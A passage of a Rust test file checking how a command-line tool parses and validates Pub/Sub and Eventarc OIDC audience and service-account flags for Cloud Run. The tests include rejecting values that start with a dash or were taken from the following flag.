                "--eventarc_oidc_service_accounts=",
            ],
            [true, true, true, true],
        ),
    ];
    for (args, want) in cases {
        let f = parse_flags(args);
        let got = [
            f.cloud_run.pubsub_trigger.oidc_audience_passed,
            f.cloud_run.pubsub_trigger.oidc_service_accounts_passed,
            f.cloud_run.eventarc_trigger.oidc_audience_passed,
            f.cloud_run.eventarc_trigger.oidc_service_accounts_passed,
        ];
        assert_eq!(got, want, "after {args:?}, passed");
    }
}

#[test]
fn test_check_trigger_oidc_emitted_rejects_either_flag_for_a_disabled_trigger() {
    for tc in [
        TriggerConfigFlags {
            oidc_audience: "https://svc.run.app".into(),
            ..TriggerConfigFlags::default()
        },
        TriggerConfigFlags {
            oidc_service_accounts: "a@p.iam.gserviceaccount.com".into(),
            ..TriggerConfigFlags::default()
        },
    ] {
        let err = check_trigger_oidc_emitted("pubsub", false, &tc);
        assert!(
            matches!(&err, Err(e) if e.contains("require --pubsub")),
            "checkTriggerOIDCEmitted({tc:?}) = {err:?}, want an error naming --pubsub"
        );
    }
}

// parity: adapted: the real clap command parses into a fresh CloudRunFlags (from_matches applies PreRunE); the fixture's entry point and temp parent are then set on it
#[tokio::test]
async fn test_compute_flags_rejects_trigger_oidc_value_taken_from_the_next_flag() {
    let ws = main_workspace();
    let t = ws.env();
    let mut f = parse_flags_in(
        &ws,
        &[
            "--pubsub",
            "--eventarc",
            "--pubsub_oidc_audience",
            "--eventarc_oidc_audience",
            "https://svc.run.app",
            "--pubsub_oidc_service_accounts",
            "--eventarc_oidc_service_accounts",
            "a@p.iam.gserviceaccount.com",
        ],
    );

    let err = f.compute_flags(&t.env).await;
    assert!(
        matches!(&err, Err(e) if e.contains(r#"--pubsub_oidc_audience "--eventarc_oidc_audience" starts with "-""#)),
        "computeFlags() = {err:?}, want it to refuse the pubsub audience taken from the next flag"
    );
}

#[tokio::test]
async fn test_compute_flags_rejects_trigger_oidc_value_starting_with_a_dash() {
    let cases: [(&str, Set, &str); 3] = [
        (
            "eventarc audience",
            |f| f.cloud_run.eventarc_trigger.oidc_audience = "-x".into(),
            r#"--eventarc_oidc_audience "-x" starts with "-""#,
        ),
        (
            "pubsub service accounts",
            |f| f.cloud_run.pubsub_trigger.oidc_service_accounts = "--eventarc".into(),
            r#"--pubsub_oidc_service_accounts "--eventarc" starts with "-""#,
        ),
        (
            "eventarc later entry",
            |f| {
                f.cloud_run.eventarc_trigger.oidc_service_accounts =
                    "a@p.iam.gserviceaccount.com, -b".into()
            },
            r#"--eventarc_oidc_service_accounts "a@p.iam.gserviceaccount.com, -b" has an entry starting with "-""#,
        ),
    ];
    for (name, set, want) in cases {
        let ws = main_workspace();
        let t = ws.env();
        let mut f = ws.flags("", AGENT_URL);
        set_valid_trigger_oidc_pairs(&mut f);
        set(&mut f);

        let err = f.compute_flags(&t.env).await;
        assert!(
            matches!(&err, Err(e) if e.contains(want)),
            "{name}: computeFlags() = {err:?}, want an error containing {want:?}"
        );
    }
}
